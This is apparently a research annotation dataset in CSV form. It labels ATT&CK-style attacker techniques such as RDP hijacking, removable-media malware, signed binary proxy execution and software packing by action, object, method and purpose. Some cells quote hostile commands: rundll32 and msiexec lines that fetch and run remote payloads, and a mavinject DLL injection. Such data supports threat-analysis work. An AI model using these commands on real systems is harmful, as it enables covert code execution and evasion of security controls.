Id,_0,_1,_2,action_what,action_where,alternative_technique,how,how_what,how_where,postcondition,precondition,tactic,technique,when,when_condition,when_object,where_attribute,why_state,why_what,why_where
t1219,,1,534,use,command and control channel,,"desktop support and remote access software , team viewer , go2assist , logmein , ammyyadmin",,,,,command and control,remote access tools,"used as <object>legitimate technical support software<\object>, and may be <condition>whitelisted<\condition> within a target environment",whitelisted,legitimate technical support software,"Team Viewer,Go2Assist, LogMein, AmmyyAdmin","establish an interactive command and control channel , redundant access , establish an interactive remote desktop session , establish a reverse connection , back-connect to a service or adversary controlled system",,
t1219,,1,534,use,desktop session,,"desktop support and remote access software , team viewer , go2assist , logmein , ammyyadmin",,,,,command and control,remote access tools,"used as <object>legitimate technical support software<\object>, and may be <condition>whitelisted<\condition> within a target environment",whitelisted,legitimate technical support software,"Team Viewer,Go2Assist, LogMein, AmmyyAdmin","establish an interactive command and control channel , redundant access , establish an interactive remote desktop session , establish a reverse connection , back-connect to a service or adversary controlled system",,
t1219,,1,534,use,desktop support,,"desktop support and remote access software , team viewer , go2assist , logmein , ammyyadmin",,,,,command and control,remote access tools,"used as <object>legitimate technical support software<\object>, and may be <condition>whitelisted<\condition> within a target environment",whitelisted,legitimate technical support software,"Team Viewer,Go2Assist, LogMein, AmmyyAdmin","establish an interactive command and control channel , redundant access , establish an interactive remote desktop session , establish a reverse connection , back-connect to a service or adversary controlled system",,
t1219,,1,534,use,remote access software,,"desktop support and remote access software , team viewer , go2assist , logmein , ammyyadmin",,,,,command and control,remote access tools,"used as <object>legitimate technical support software<\object>, and may be <condition>whitelisted<\condition> within a target environment",whitelisted,legitimate technical support software,"Team Viewer,Go2Assist, LogMein, AmmyyAdmin","establish an interactive command and control channel , redundant access , establish an interactive remote desktop session , establish a reverse connection , back-connect to a service or adversary controlled system",,
t1076,,,535,connect,system,,,,,,,lateral movement,remote desktop protocol,service is enabled and allows access to accounts with known credentials,,,rdp/rds,expand access,,
t1076,,,536,use,credential access techniques,,,,,,,lateral movement,remote desktop protocol,,,,,acquire credentials  to use with rdp,,
t1076,,,537,use,rdp,,accessibility features technique,,,,,lateral movement,remote desktop protocol,,,,,persistence,,
t1076,,,538,perform,rdp session hijacking,,,,,,,lateral movement,remote desktop protocol,,,,,"<what> stealing <\what> a <attribute> legitimate user's remote  <\attribute> <where>  session <\where>.typically, a user is notified when someone else is trying to steal their session and prompted with a question.with <when> system permissions <\when> and using <how>terminal services console, c:\windows\system32\tscon.exe <\how> [session number to be stolen], an adversary can <what> hijack <\what> a <where> session <\where> without the need for credentials or prompts to the user.this can be done remotely or locally and with active or disconnected sessions.<where> it <\where> can also <what> lead <\what> to <why> remote system discovery and privilege escalation","stealing  ,  hijack  ,  lead","session  ,  session  ,  it"
t1076,,,539,stealing,domain admin,,,,,,,lateral movement,remote desktop protocol,,,,higher privileged account,,,
t1105,,1,541,copy,file,,"command and control channel , alternate protocols with another tool , ftp; mac and linux with native tools , scp , rsync , sftp  ;remote execution using inherent file sharing protocols such as file sharing over smb , authenticated connections with windows admin shares , remote desktop protocol",,,,,command and control,remote file copy,,,,,stage adversary tools or other files;bring tools into the victim network,"stage, copy","file,"
t1021,,,542,use,valid accounts,,,,,,,lateral movement,remote services,"<condition>accept remote <\condition>, <object>connections<\object>",accept remote,connections,,log into a service,,
t1018,,,543,get listing,system,,,,,,,discovery,remote system discovery,,,,"IP address, hostname, or other logical identifier","<what>get<\what> a <where>listing of other systems<\where> by ip address, hostname, or other logical identifier on a network , <what>discover<\what> the <where>hostname to ip address mappings<\where> of remote systems","get , discover","listing of other systems , hostname to ip address mappings"
t1018,,,544,use,local host file,,,,,,,discovery,remote system discovery,,,,,"<what>get<\what> a <where>listing of other systems<\where> by ip address, hostname, or other logical identifier on a network , <what>discover<\what> the <where>hostname to ip address mappings<\where> of remote systems","get , discover","listing of other systems , hostname to ip address mappings"
t1018,,,545,acquire,information,,using net,,,,,discovery,remote system discovery,,,,,,,
t1018,,,546,view,c:\windows\system32\drivers\etc\hosts file,,,,,,,discovery,remote system discovery,,,,,<what>gain insight<\what> into the existing <where>hostname to ip mappings<\where> on the system,gain insight,hostname to ip mappings
t1018,,,547,use,utility,,,,,,,discovery,remote system discovery,,,,ping,<what>gather<\what> <where>information about remote systems<\where>,gather,information about remote systems
t1018,,,548,view,,,,,,,,discovery,remote system discovery,,,,,<what>gain insight<\what> into existing <where>hostname to ip mappings<\where> on the system,gain insight,hostname to ip mappings
t1018,,,548,view,etc,,,,,,,discovery,remote system discovery,,,,,<what>gain insight<\what> into existing <where>hostname to ip mappings<\where> on the system,gain insight,hostname to ip mappings
t1018,,,548,view,hosts file,,,,,,,discovery,remote system discovery,,,,,<what>gain insight<\what> into existing <where>hostname to ip mappings<\where> on the system,gain insight,hostname to ip mappings
t1018,,,549,use,utility,,,,,,,discovery,remote system discovery,,,,ping,<what>gather<\what> <where>information about remote systems<\where>,gather,information about remote systems
t1018,,,550,view,,,,,,,,discovery,remote system discovery,,,,,<what>gain insight <\what> into existing <where>hostname to ip mappings<\where> on the system,gain insight,hostname to ip mappings
t1018,,,550,view,etc,,,,,,,discovery,remote system discovery,,,,,<what>gain insight <\what> into existing <where>hostname to ip mappings<\where> on the system,gain insight,hostname to ip mappings
t1018,,,550,view,hosts file,,,,,,,discovery,remote system discovery,,,,,<what>gain insight <\what> into existing <where>hostname to ip mappings<\where> on the system,gain insight,hostname to ip mappings
t1164,,,551,modify,file,,,"registering , enabling",dll,,,persistence,re-opened applications,,,,,"<what>include<\what> a <where>link<\where> to their malicious executable , <what>provide<\what> apersistence mechanism","include , provide",link
t1164,,,552,include,link,,,,,,,persistence,re-opened applications,,,,,,,
t1091,,1,356,use,autorun feature,,,,,"code-executed, 
initial-access/lateral-movement","external-media-allowed,
autorun-enables","initial access,lateral movement",replication through removable media,<object>media<\object> is <condition>inserted into a system and executes<\condition>,inserted into a system and executes,media,,,,
t1091,,,357,modify,executable file,,,,,"code-executed, 
initial-access/lateral-movement","external-media-allowed,
autorun-enables","initial access,lateral movement",replication through removable media,,,,removable media,,,
t1091,,,382,copy-malware-to,removable media,,"copying malware, renaming /
manual manipulation of the media / 
format the media /
modification to the media's firmware itself.",,,"code-executed, 
initial-access/lateral-movement","external-media-allowed,
autorun-enables","initial access,lateral movement",replication through removable media,"Technique:Autorun-enables, and 
<object>media<\object> <condition>inserted into a system and executes<\condition>","enabled, exist/allowed","autorun, removable media",,execute code,execute,code
t1091,,,382,copy-malware-to,USP,,"copying malware, renaming /
manual manipulation of the media / 
format the media /
modification to the media's firmware itself.",,,"code-executed, 
initial-access/lateral-movement","external-media-allowed,
autorun-enables","initial access,lateral movement",replication through removable media,"Technique:Autorun-enables, and 
<object>media<\object> <condition>inserted into a system and executes<\condition>","enabled, exist/allowed","autorun, removable media",,execute code,execute,code
t1091,,,382,copy-malware-to,media firmware,,"copying malware, renaming /
manual manipulation of the media / 
format the media /
modification to the media's firmware itself.",,,"code-executed, 
initial-access/lateral-movement","external-media-allowed,
autorun-enables","initial access,lateral movement",replication through removable media,"Technique:Autorun-enables, and 
<object>media<\object> <condition>inserted into a system and executes<\condition>","enabled, exist/allowed","autorun, removable media",,execute code,execute,code
t1091,,,382,move-code-to,removable media,,"copying malware, renaming /
manual manipulation of the media / 
format the media /
modification to the media's firmware itself.",,,"code-executed, 
initial-access/lateral-movement","external-media-allowed,
autorun-enables","initial access,lateral movement",replication through removable media,"Technique:Autorun-enables, and 
<object>media<\object> <condition>inserted into a system and executes<\condition>","enabled, exist/allowed","autorun, removable media",,execute code,execute,code
t1091,,,382,move-code-to,USP,,"copying malware, renaming /
manual manipulation of the media / 
format the media /
modification to the media's firmware itself.",,,"code-executed, 
initial-access/lateral-movement","external-media-allowed,
autorun-enables","initial access,lateral movement",replication through removable media,"Technique:Autorun-enables, and 
<object>media<\object> <condition>inserted into a system and executes<\condition>","enabled, exist/allowed","autorun, removable media",,execute code,execute,code
t1091,,,382,move-code-to,media firmware,,"copying malware, renaming /
manual manipulation of the media / 
format the media /
modification to the media's firmware itself.",,,"code-executed, 
initial-access/lateral-movement","external-media-allowed,
autorun-enables","initial access,lateral movement",replication through removable media,"Technique:Autorun-enables, and 
<object>media<\object> <condition>inserted into a system and executes<\condition>","enabled, exist/allowed","autorun, removable media",,execute code,execute,code
t1091,,,382,modify,removable media,,"copying malware, renaming /
manual manipulation of the media / 
format the media /
modification to the media's firmware itself.",,,"code-executed, 
initial-access/lateral-movement","external-media-allowed,
autorun-enables","initial access,lateral movement",replication through removable media,"Technique:Autorun-enables, and 
<object>media<\object> <condition>inserted into a system and executes<\condition>","enabled, exist/allowed","autorun, removable media",,execute code,execute,code
t1091,,,382,modify,USP,,"copying malware, renaming /
manual manipulation of the media / 
format the media /
modification to the media's firmware itself.",,,"code-executed, 
initial-access/lateral-movement","external-media-allowed,
autorun-enables","initial access,lateral movement",replication through removable media,"Technique:Autorun-enables, and 
<object>media<\object> <condition>inserted into a system and executes<\condition>","enabled, exist/allowed","autorun, removable media",,execute code,execute,code
t1091,,,382,modify,media firmware,,"copying malware, renaming /
manual manipulation of the media / 
format the media /
modification to the media's firmware itself.",,,"code-executed, 
initial-access/lateral-movement","external-media-allowed,
autorun-enables","initial access,lateral movement",replication through removable media,"Technique:Autorun-enables, and 
<object>media<\object> <condition>inserted into a system and executes<\condition>","enabled, exist/allowed","autorun, removable media",,execute code,execute,code
t1091,,,382,fromat,removable media,,"copying malware, renaming /
manual manipulation of the media / 
format the media /
modification to the media's firmware itself.",,,"code-executed, 
initial-access/lateral-movement","external-media-allowed,
autorun-enables","initial access,lateral movement",replication through removable media,"Technique:Autorun-enables, and 
<object>media<\object> <condition>inserted into a system and executes<\condition>","enabled, exist/allowed","autorun, removable media",,execute code,execute,code
t1091,,,382,fromat,USP,,"copying malware, renaming /
manual manipulation of the media / 
format the media /
modification to the media's firmware itself.",,,"code-executed, 
initial-access/lateral-movement","external-media-allowed,
autorun-enables","initial access,lateral movement",replication through removable media,"Technique:Autorun-enables, and 
<object>media<\object> <condition>inserted into a system and executes<\condition>","enabled, exist/allowed","autorun, removable media",,execute code,execute,code
t1091,,,382,fromat,media firmware,,"copying malware, renaming /
manual manipulation of the media / 
format the media /
modification to the media's firmware itself.",,,"code-executed, 
initial-access/lateral-movement","external-media-allowed,
autorun-enables","initial access,lateral movement",replication through removable media,"Technique:Autorun-enables, and 
<object>media<\object> <condition>inserted into a system and executes<\condition>","enabled, exist/allowed","autorun, removable media",,execute code,execute,code
t1085,,,559,use,rundll32.exe,,,,,,,"defense evasion,execution",rundll32,,,,,"proxy <what>execution<\what> of <where>code<\where> , avoid <what>triggering<\what> <where>security tools<\where>","execution , triggering","code , security tools"
t1085,,,560,use,rundll32.exe,,undocumented shell32.dll functions control_rundll and control_rundllasuser,,,,,"defense evasion,execution",rundll32,,,,,<what>execute<\what> <where>control panelitem files (.cpl) <\where>,execute,control panelitem files (.cpl)
t1085,,,561,use,rundll32.exe,,"rundll32.exe javascript:..\mshtml,runhtmlapplication ;document.write();getobject(script:https[:]//www[.]example[.]com/malicious.sct)",,,,,"defense evasion,execution",rundll32,,,,,<what>execute<\what> <where>scripts<\where> such as <where>javascript<\where>,execute,"scripts , javascript"
t1085,,,562,execute,script,,,,,,,"defense evasion,execution",rundll32,,,,,,,
t1085,,,562,execute,javascript,,,,,,,"defense evasion,execution",rundll32,,,,,,,
t1085,,,563,execute,code,,,,,,,"defense evasion,execution",rundll33,,,,,,,
t1085,,,564,trigger,security tool,,,,,,,"defense evasion,execution",rundll33,,,,,,,
t1053,,1,565,execute,program,"exfiltration over command and control channel , exfiltration over alternative protocol","at , schtasks",use,task scheduling,,,"execution,persistence,privilege escalation",scheduled task,scheduling a task on a remote system typically required being a <condition>member of the <object>administrators group<\object><\condition> on the the remote system.,member of the <object>administrators group<\object>,administrators group,,"execute programs at system startup or on a scheduled basis forpersistence , conduct remote execution as part of lateral movement , gain system privileges , run a process under the context of a specified account",,
t1053,,1,565,run,program,"exfiltration over command and control channel , exfiltration over alternative protocol","at , schtasks",use,task scheduling,,,"execution,persistence,privilege escalation",scheduled task,scheduling a task on a remote system typically required being a <condition>member of the <object>administrators group<\object><\condition> on the the remote system.,member of the <object>administrators group<\object>,administrators group,,"execute programs at system startup or on a scheduled basis forpersistence , conduct remote execution as part of lateral movement , gain system privileges , run a process under the context of a specified account",,
t1029,,1,566,exfiltrate,data,,"certain times of day , certain intervals",use,command and control channel,,,exfiltration,scheduled transfer,,,,,blend traffic patterns with normal activity,blend,traffic pattern
t1113,,1,567,take screen capture,desktop,,,use,native command screencapture/xwd,screen-captured,command-access,collection,screen capture,,,,,gather information; capture screenshots,,
t1180,,,568,use,screensaver setting,,<what>setting<\what> the <where>screensaver<\where>,,,,,persistence,screensaver,,,,"scrnsave.exe , screensaveactive , screensaverissecure , screensavertimeout","<what>maintain<\what>persistence , <what>run<\what> <where>malware<\where> after a certain timeframe of user inactivity","maintain , run",malware
t1180,,,569,run,malware,,,,,,,persistence,screensaver,,,,,,,
t1064,,,570,use,script,,,interacting,operating system,,,"defense evasion,execution",scripting,,,,,<what>aid<\what> in operations<why> and <why><what>perform<\what> multiple actions that would otherwise be manual,"aid , perform",
t1064,,,571,bypass,process monitoring mechanism,,,interacting,operating system,,,"defense evasion,execution",scripting,,,,,,,
t1064,,,572,use,scripting language,,directly <what>interacting<\what> with the <where>operating system<\where> at an api level,interacting,operating system,,,"defense evasion,execution",scripting,,,,,<what>bypass<\what> <where>process monitoring mechanisms<\where>,bypass,process monitoring mechanisms
t1064,,,573,use,vbscript,,directly <what>interacting<\what> with the <where>operating system<\where> at an api level,use,powershell,,,"defense evasion,execution",scripting,,,,,<what>bypass<\what> <where>process monitoring mechanisms<\where>,bypass,process monitoring mechanisms
t1064,,,574,use,powershell,,directly <what>interacting<\what> with the <where>operating system<\where> at an api level,,,,,"defense evasion,execution",scripting,,,,,<what>bypass<\what> <where>process monitoring mechanisms<\where>,bypass,process monitoring mechanisms
t1064,,,575,use,command-line batch script,,directly <what>interacting<\what> with the <where>operating system<\where> at an api level,,,,,"defense evasion,execution",scripting,,,,,<what>bypass<\what> <where>process monitoring mechanisms<\where>,bypass,process monitoring mechanisms
t1064,,,576,embedd,script,,"exploitation for client execution , metasploit  , veil , powersploit  , <what>use<\what> <where>powershell<\where>",use,attributes,,,"defense evasion,execution",scripting,"<condition><object>macros<\object> being allowed<\condition> , user will <condition>accept to activate <\condition>them","<object>macros<\object> being allowed , <object>macros<\object> being allowed , accept to activate","macros , macros",office documents as macros,,,
t1063,,,577,get listing,security software,,"netsh, reg query with reg , dir with cmd , tasklist",,,,,discovery,security software discovery,,,,,"get a listing of security software, configurations, defensive tools, and sensors that are installed on the system , <what>obtain<\what> <where>security software information<\where>",obtain,security software information
t1063,,,577,get listing,configuration,,"netsh, reg query with reg , dir with cmd , tasklist",,,,,discovery,security software discovery,,,,,"get a listing of security software, configurations, defensive tools, and sensors that are installed on the system , <what>obtain<\what> <where>security software information<\where>",obtain,security software information
t1063,,,577,get listing,defensive tool,,"netsh, reg query with reg , dir with cmd , tasklist",,,,,discovery,security software discovery,,,,,"get a listing of security software, configurations, defensive tools, and sensors that are installed on the system , <what>obtain<\what> <where>security software information<\where>",obtain,security software information
t1063,,,577,get listing,sensor,,"netsh, reg query with reg , dir with cmd , tasklist",,,,,discovery,security software discovery,,,,,"get a listing of security software, configurations, defensive tools, and sensors that are installed on the system , <what>obtain<\what> <where>security software information<\where>",obtain,security software information
t1063,,,578,use,command,,"netsh, reg query with reg , dir with cmd , tasklist",,,,,discovery,security software discovery,,,,,"get a listing of security software, configurations, defensive tools, and sensors that are installed on the system , <what>obtain<\what> <where>security software information<\where>",obtain,security software information
t1101,,,579,modify,registry key,,,,,,,persistence,security support provider,,,,"hklm\system\currentcontrolset\control\lsa\security packages , hklm\system\currentcontrolset\control\lsa\osconfig\security packages",<what>add<\what> new <where>ssps<\where>,add,ssps
t1101,,,580,add,security support provider,,,use,,,,persistence,security support provider,,,,,,,
T1167,,,581,scan,securityd memory,,,,,,,Credential Access,Securityd Memory,adversary can <condition>obtain <object>root access<\object><\condition>,obtain <object>root access<\object>,root access,,<what>find<\what> the correct sequence of <where>keys<where>,find,keys
t1167,,,582,find,key,,,,,,,Credential Access,Securityd Memory,,,,correct sequence,,,
t1035,,,583,execute,binary,"new service , modify existing service","method that <what>interacts<\what> with <where>windows services<\where>, such as the <where>service control manager<\where> , <what>creating<\what> a new <where>service<\where> , <<what>modifying<\what> an existing <where>service<\where>","interacts , creating , modifying","windows services/service control manager , service , service",,,execution,service execution,,,,,,,
t1035,,,584,create,service,"new service , modify existing service",new service,"interacts , creating , modifying","windows services/service control manager , service , service",,,execution,service execution,,,,,,,
t1035,,,585,modify,service,,Modify service,,,,,execution,service execution,,,,,,,
t1035,,,586,execute,command,,"method that <what>interacts<\what> with <where>windows services<\where>, such as the <where>service control manager<\where> , <what>creating<\what> a new <where>service<\where> , <<what>modifying<\what> an existing <where>service<\where>",,,,,execution,service execution,,,,,,,
t1035,,,587,execute,script,,"method that <what>interacts<\what> with <where>windows services<\where>, such as the <where>service control manager<\where> , <what>creating<\what> a new <where>service<\where> , <<what>modifying<\what> an existing <where>service<\where>",,,,,execution,service execution,,,,,,,
t1058,,,588,change,service binpath,,,,,,,"privilege escalation,persistence",service registry permissions weakness,"<condition><object>permissions<\object> for users and groups are not properly set<\condition> , <condition>allow access to the <object>registry keys<\object><\condition> for a service","<object>permissions<\object> for users and groups are not properly set , allow access to the <object>registry keys<\object>","permissions , registry keys",,"<what>point<\what> to a different <where>executable<\where>  , <what>gain<\what>persistence , privilege escalation","point , gain","executable,persistence"
t1058,,,589,alter,imagepath,,,,,,,"privilege escalation,persistence",service registry permissions weakness,,,,,"<what>point<\what> to a different <where>executable<\where>  , <what>gain<\what>persistence , privilege escalation","point , gain","executable,persistence"
t1058,,,590,alter,registry key,,,,,,,"privilege escalation,persistence",service registry permissions weakness,,,,service failure parameters,"<what>point<\what> to a different <where>executable<\where>  , <what>gain<\what>persistence , privilege escalation","point , gain","executable,persistence"
t1166,,1,591,use,setuid and setgid bits,,setsuid or setgid bits,,,,,"privilege escalation,persistence",setuid and setgid,,,,,get <where>code<\where> <what>running<\what> in a different user context; do  shell escape; exploit  vulnerability,running,code
t1166,,1,591,use,setsuid flag,,setsuid or setgid bits,,,,,"privilege escalation,persistence",setuid and setgid,,,,,get <where>code<\where> <what>running<\what> in a different user context; do  shell escape; exploit  vulnerability,running,code
t1051,,,592,add,content,,"open network file share , web browser",,,,,lateral movement,shared webroot,that <condition>contains the website's webroot or web content directory<\condition>,contains the website's webroot or web content directory,,,execute the malicious content,,
t1051,,,592,add,content,,"open network file share , web browser",,,,,lateral movement,shared webroot,that <condition>contains the website's webroot or web content directory<\condition>,contains the website's webroot or web content directory,,,execute the malicious content,,
t1051,,,592,browse,content,,"open network file share , web browser",,,,,lateral movement,shared webroot,that <condition>contains the website's webroot or web content directory<\condition>,contains the website's webroot or web content directory,,,execute the malicious content,,
t1051,,,592,browse,content,,"open network file share , web browser",,,,,lateral movement,shared webroot,that <condition>contains the website's webroot or web content directory<\condition>,contains the website's webroot or web content directory,,,execute the malicious content,,
t1051,,,593,execute,content,,,,,,,lateral movement,shared webroot,,,,,,,
t1051,,,594,upload,remote access tool,,,,,,,lateral movement,shared webroot,,,,,,,
t1051,,,595,upload,php script,,,,,,,lateral movement,shared webroot,when a <object>specific page<\object> <condition>is visited<\condition>.,is visited,specific page,,execute the rat on the system running the web server,,
t1051,,,596,execute,RAT,,,,,,,lateral movement,shared webroot,,,,,,,
t1023,,,597,use,shortcut,,,,,,,persistence,shortcut modification,,,,,<what>execute<\what> their <where>tools<\where> forpersistence,execute,tools
t1023,,,598,execute,tool,,,,,,,persistence,shortcut modification,,,,,,,
t1023,,,599,create,shortcut,,<what>use<\what> <where>masquerading<\where>,,,,,persistence,shortcut modification,,,,,<what>look<\what> like a <where>legitimate program<\where>,look,legitimate program
t1023,,,600,edit,target path,,,,,,,persistence,shortcut modification,,,,,,,
t1023,,,601,replace,shortcut,,,setting,screensaver,,,persistence,shortcut modification,,,,existing,their <where>tools<\where> will be <what>executed<\what> instead of the intended legitimate program,executed,tools
t1178,,,602,use,sid-history injection,,,,,,,privilege escalation,sid-history injection,domain administrator (or equivalent) rights,,,,privilege escalation,,
t1178,,,603,insert sid value,sid history,,,,,,,privilege escalation,sid-history injection,,,,,"<what>enable impersonation<\what>  of arbitrary <where>users<\where>/<where>groups<\where> , elevated access to local resources",enable impersonation,"users , groups"
t1218,,,604,use,binary,,,,,,,"defense evasion,execution",signed binary proxy execution,,,,microsoft signed,"proxy <what>execution<\what> of other <where>files<\where> , <what>execute<\what> malicious <where>files<\where> , <what>bypass<\what> <where>application whitelisting<\where> and <where>signature validation<\where> on systems","execution , execute , bypass","files , files , applicationwhitelisting , signature validation"
t1218,,,605,proxy execute,file,,,,,,,"defense evasion,execution",signed binary proxy execution,,,,,,,
t1218,,,606,bypass,application whitelisting solution,,,,,,,"defense evasion,execution",signed binary proxy execution,,,,,,,
t1218,,,606,bypass,signature validation restriction,,,,,,,"defense evasion,execution",signed binary proxy execution,,,,,,,
t1218,,,607,use,msiexec.exe,,"msiexec.exe /q /i c:\path\to\file.msi , msiexec.exe /q /i http[:]//site[.]com/file.msi , msiexec.exe /y c:\path\to\file.dll",,,,,"defense evasion,execution",signed binary proxy execution,,,,,"<what>launch<\what> malicious <where>msi files<\where> , <where>code<\where> <what>execution<\what>","launch , execution","msi files , code"
t1218,,,608,launch,file,,"msiexec.exe /q /i c:\path\to\file.msi , msiexec.exe /q /i http[:]//site[.]com/file.msi , msiexec.exe /y c:\path\to\file.dll",,,,,"defense evasion,execution",signed binary proxy execution,,,,maicious msi,,,
t1218,,,609,use,msiexec.exe,,"msiexec.exe /q /i c:\path\to\file.msi , msiexec.exe /q /i http[:]//site[.]com/file.msi , msiexec.exe /y c:\path\to\file.dll",,,,,"defense evasion,execution",signed binary proxy execution,,,,,<what>launch<\what> local or network accessible <where>msi files<\where>,launch,msi files
t1218,,,610,use,msiexec.exe,,"msiexec.exe /q /i c:\path\to\file.msi , msiexec.exe /q /i http[:]//site[.]com/file.msi , msiexec.exe /y c:\path\to\file.dll",,,,,"defense evasion,execution",signed binary proxy execution,,,,,<what>execute<\what> <where>dlls<\where>,execute,dlls
t1218,,,611,execute,DLL,,,,,,,"defense evasion,execution",signed binary proxy execution,,,,,,,
t1218,,,612,use,utility,,"c:\program files\common files\microsoft shared\clicktorun\mavinject32.exe <pid> /injectrunning <path dll> , c:\windows\system32\mavinject.exe <pid> /injectrunning <path dll>",,,,,"defense evasion,execution",signed binary proxy execution,,,,mavinject,<what>input<\what> a <where>dll<\where> into a running process,input,dll
t1218,,,613,input DLL,process,,,,,,,"defense evasion,execution",signed binary proxy execution,,,,,,,
t1218,,,614,use,utility,,,,,,,"defense evasion,execution",signed binary proxy execution,,,,syncappvpublishingserver.exe,<what>run<\what> <where>powershell scripts<\where> without executing powershell.exe,run,powershell scripts
t1218,,,615,run,powershell script,,,,,,,"defense evasion,execution",signed binary proxy execution,,,,,,,
t1218,,,616,use,utility,,"regsvr option , odbcconf.exe /s /a {regsvr c:\users\public\file.dll}",,,,,"defense evasion,execution",signed binary proxy execution,,,,odbcconf.exe,"<what>execute<\what> <where>functionality equivalent to regsvr32<\where> , <what>execute<\what> a <where>dll<\where>","execute , execute","functionality equivalent to regsvr32 , dll"
t1216,,,617,use,script,,,,,,,"defense evasion,execution",signed script proxy execution,,,,signed with trusted certificates,"proxy <what>execution<\what> of malicious <where>files<\where> , <what>bypass<\what> <where>signature validation restrictions<\where> and <where>application whitelisting solutions<\where>","execution , bypass","files , signature validation restrictions , application whitelisting solutions"
t1216,,,618,bypass,signature validation restriction,,,,,,,"defense evasion,execution",signed script proxy execution,,,,,,,
t1216,,,619,proxy execute,file,,,,,,,"defense evasion,execution",signed script proxy execution,,,,,,,
t1216,,,620,bypass,application whitelisting solution,,,,,,,"defense evasion,execution",signed script proxy execution,,,,,,,
t1216,,,621,use,pubprn.vbs,,"cscript c[:]\windows\system32\printing_admin_scripts\en-us\pubprn[.]vbs 127.0.0.1  , script:http[:]//192.168.1.100/hi.png",,,,,"defense evasion,execution",signed script proxy execution,,,,,proxy <what>execution<\what> from a remote site,execution,
t1198,,,622,use,sip and trust provider,,,,,,,"defense evasion,persistence",sip and trust provider hijacking,,,,,"<what>subvert<\what> <where>trust controls<\where> , <what>bypass<\what> <where>security policies<\where>","subvert , bypass","trust controls , security policies"
t1198,,,623,bypass,security policy,,,,,,,"defense evasion,persistence",sip and trust provider hijacking,,,,,,,
t1198,,,624,hijack,sip,,,,,,,"defense evasion,persistence",sip and trust provider hijacking,,,,,"<what>mislead<\what> <where>operating system<\where> and <where>whitelisting tools<\where> , <what>classify<\what> malicious (or any) <where>code<\where> as signed","mislead , classify","operating system , whitelisting tools , code"
t1198,,,625,hijack,trust provider component,,,,,,,"defense evasion,persistence",sip and trust provider hijacking,,,,,"<what>mislead<\what> <where>operating system<\where> and <where>whitelisting tools<\where> , <what>classify<\what> malicious (or any) <where>code<\where> as signed","mislead , classify","operating system , whitelisting tools , code"
t1198,,,626,mislead,operating system,,,pointing,dll,,,"defense evasion,persistence",sip and trust provider hijacking,,,,,,,
t1198,,,627,mislead,whitelisting tool,,,,,,,"defense evasion,persistence",sip and trust provider hijacking,,,,,,,
t1198,,,628,modify,dll,,,pointing,dll,,,"defense evasion,persistence",sip and trust provider hijacking,,,,,,,
t1198,,,630,modify,dll,,,,,,,"defense evasion,persistence",sip and trust provider hijacking,,,,,,,
t1198,,,632,modify,dll,,,,,,,"defense evasion,persistence",sip and trust provider hijacking,,,,,,,
t1198,,,634,hijack,sip,,,,,,,"defense evasion,persistence",sip and trust provider hijacking,,,,,,,
t1198,,,635,hijack,trust provider component,,,use,web shell,,,"defense evasion,persistence",sip and trust provider hijacking,,,,,<what>enable<\what> persistent <where>code execution<\where>,enable,code execution
t1045,,,636,compress,executable,,software packing,,,,,defense evasion,software packing,,,,,,,
t1045,,,637,encrypt,executable,,software packing,,,,,defense evasion,software packing,,,,,,,
t1045,,,638,pack,executable,,,,,,,defense evasion,software packing,,,,,avoid signature-based detection,,
t1045,,,639,use,utility,,,"intercepting , hooking , modifying",operating system api calls,,,defense evasion,software packing,,,,,perform software packing,,
t1045,,,640,use,mpress,,,,,,,defense evasion,software packing,,,,,,,
t1045,,,641,use,upx,,,,,,,defense evasion,software packing,,,,,,,
t1153,,,642,execute,source,,"source /path/to/filename [arguments]  ,  . /path/to/filename [arguments]",,,,,"defense evasion,execution",source,,,,"source /path/to/filename [arguments]  ,  . /path/to/filename [arguments]",,,
t1151,,,643,hide,filetype,,<what>changing<\what> the <where>extension<\where> of a file,,,,,"defense evasion,execution",space after filename,,,,,,,
t1151,,,644,chage,file extension,,,,,,,"defense evasion,execution",space after filename,,,,,,,
t1151,,,645,use,space after filename,,,,,,,"defense evasion,execution",space after filename,,,,,trick users into double clicking benign-looking files,,
t1151,,,646,double click,file,,,,,,,"defense evasion,execution",space after filename,,,,,,,
t1184,,,659,hijack,connection,,"compromising the ssh agent , having access to the agent's socket",,,,,lateral movement,ssh hijacking,if an adversary is able to <condition>obtain root access<\condition>,obtain root access,,,,,
t1071,,1,660,blend command,traffic,,"using a common, standardized application layer protocol ,  using  http ,  using  https ,  using  smtp ,  using  dns",use,common/standardized application layer protocol/ http/https /smtp / dns,,,command and control,standard application layer protocol,,,,existing,avoid detection,,
